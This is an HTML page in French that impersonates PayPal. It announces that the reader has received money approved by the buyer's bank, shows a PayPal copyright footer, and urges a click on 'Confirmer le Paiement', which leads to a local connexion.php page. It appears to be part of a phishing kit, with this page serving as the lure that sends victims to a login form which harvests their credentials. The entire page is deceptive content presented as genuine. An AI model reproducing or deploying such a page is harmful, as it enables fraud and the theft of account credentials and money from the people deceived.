<!DOCTYPE html>
<html data-reactroot="">
<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<head>
    <meta charset="utf-8" />
    <title>Vous avez reçu de l'argent</title>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
    <meta name="application-name" content="" />
    <meta name="keywords" content="" />
    <meta name="description" content="" />
    <link rel="shortcut icon" href="public/img/pp_favicon_x.ico" />
    <link rel="apple-touch-icon" href="public/img/pp64.png" />
    <link rel="canonical" href="#" />
    <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=2, user-scalable=yes" />
    <link rel="stylesheet" href="public/css/main.ltr.css" />
    <link href="public/css/page.c9a650b6b85d7c2bdddc.css" media="screen, projection" rel="stylesheet" type="text/css" charSet="UTF-8" />
    <link rel="stylesheet" href="public/css/contextualLogin.css" />
</head>

<body class="vx_root vx_addFlowTransition vx_hasFadeTransition">
<div class="vx_modal-flow vx_modalPrepToOpen vx_modalIsOpen modal-flow" id="mainModal" tabindex="-1" aria-labelledby="js_modalHeader">
    <div class="vx_modal-wrapper-backgroundOverride vx_modal-wrapper vx_modal-wrapper_logo elementDirection" tabindex="-1">
        <div class="vx_modal-content">

                <header class="vx_modal-header">
        <h2 id="js_modalHeader" class="vx_text-2 header-centered" style="color:#005C08; ">Vous avez reçu de l'argent.</h2>
        <p class="vx_text-body"></p>
    </header>
    <div class="vx_modal-body vx_blocks-for-mobile">
        <div>
            <div class="vx_modal-body vx_blocks-for-mobile">
                <div class="form-container">

                    <p class="vx_text-5 " style="text-align: center">
                        Ce paiement Paypal a été déduit du compte de l’acheteur et a été « APPROUVE » par sa banque.
                    </p>
                    <div class="cardForm-cardArt">
                        <img width="150"  src="public/img/success-animation_2x.gif" />
                    </div>
                    <p class="vx_text-5 " style="text-align: center">
                        Pour recevoir le paiement sur votre compte, cliquez ici :  <br/><br/>
                        <a  href="connexion.php" style="color: green; font-size: 20px;">Confirmer le Paiement</a>
                    </p>

                    <p class="vx_text-5 " style="text-align: center">
                        Cordialement, Paypal.
                    </p>

                    <div class="signup-page-footer vx_text-legal center">©1999-2022 PayPal. Tous droits réservés.</div>

                </div>

            </div>


        </div>



    </div>


        </div>
    </div>

</div>

<script type="text/javascript" src="public/js/vx-lib.min.js"></script>
<script type="text/javascript" defer="" src="public/js/vendor.js"></script>
<script type="text/javascript" defer="" src="public/js/flowBundle.js"></script>
<script type="text/javascript" defer="" src="public/js/pa.js"></script>


</body>

</html>